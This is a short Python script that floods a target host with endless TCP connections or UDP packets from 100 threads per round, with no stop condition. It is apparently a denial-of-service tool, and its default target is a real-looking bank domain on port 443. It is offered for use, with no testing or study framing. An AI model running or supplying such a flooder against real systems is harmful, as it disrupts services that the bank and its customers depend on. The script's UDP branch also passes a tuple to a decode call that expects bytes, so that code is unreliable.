import socket
import sys
import threading


def send_tcp(ip, port, send_msg):

    send_msg = str.encode(send_msg)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        try:
            s.connect((ip, port))
        except socket.error as e:
            print('connect error', e)
            return
        s.sendall(send_msg)
        data = s.recv(1024)
        data = bytes.decode(data)
        print(f"Received {data!r}")


def send_udp(ip, port, send_msg):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        send_msg = str.encode(send_msg)
        s.sendto(send_msg, (ip, port))
        data = s.recvfrom(1024)
        data = bytes.decode(data)
        print(data)


def get_ip_from_url(url: str) -> str:
    """
    "google.com" -> '142.251.39.46'
    :param url: "google.com"
    :param origin_url: "https://google.com"
    :return: "142.251.39.46"
    """
    site_ip = False
    try:
        site_ip = socket.gethostbyname(url)
    except socket.gaierror:
        print(f'This site may be not valid "{url}"')
    return site_ip


def do_threads(n_thread, func, args):
    while True:
        threads = []
        for i in range(n_thread):
            t = threading.Thread(target=func, args=args, daemon=True)
            t.start()
            threads.append(t)
        for ts in threads:
            ts.join()

        # break

if __name__ == "__main__":
    print('start')
    msg = "Hello world"
    sys.argv.pop(0)
    if data := sys.argv:
        host = data[0]
        port = int(data[1])
        type_conn = data[2]
    else:
        host = 'my.bank-hlynov.ru'
        port = 443
        type_conn = 'tcp'

    ip = get_ip_from_url(host)
    if type_conn.strip() == 'tcp':
        do_threads(100, send_tcp, (ip, port, msg))
    elif type_conn.strip() == 'udp':
        do_threads(100, send_udp, (ip, port, msg))